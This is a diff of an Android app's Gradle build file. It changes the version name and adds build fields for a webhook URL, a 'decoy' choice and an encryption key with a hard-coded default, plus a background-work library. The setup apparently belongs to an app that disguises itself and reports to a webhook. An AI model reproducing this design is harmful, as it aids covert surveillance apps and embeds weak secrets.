@@ -23,7 +23,7 @@ android {
         minSdk 26
         targetSdk 34
         versionCode 620
-        versionName "4.0.8"
+        versionName "2.2.3"
         
         // Read WEBHOOK_URL from local.properties
         def localProperties = new Properties()
@@ -33,7 +33,12 @@ android {
         }
         
         def webhookUrl = localProperties['WEBHOOK_URL'] ?: ""
+        def decoyChoice = localProperties['DECOY_CHOICE'] ?: "1"
+        def encryptionKey = localProperties['ENCRYPTION_KEY'] ?: "AndroidKernel1337"
+
         buildConfigField "String", "WEBHOOK_URL", "\"${webhookUrl}\""
+        buildConfigField "int", "DECOY_CHOICE", "${decoyChoice}"
+        buildConfigField "String", "ENCRYPTION_KEY", "\"${encryptionKey}\""
     }
 
     signingConfigs {
@@ -86,6 +91,7 @@ dependencies {
     implementation 'com.google.android.material:material:1.11.0'
     implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
     implementation 'org.nanohttpd:nanohttpd:2.3.1'
+    implementation "androidx.work:work-runtime:2.9.0"
 }
 
 // Fix for "The processing instruction target matching '[xX][mM][lL]' is not allowed"
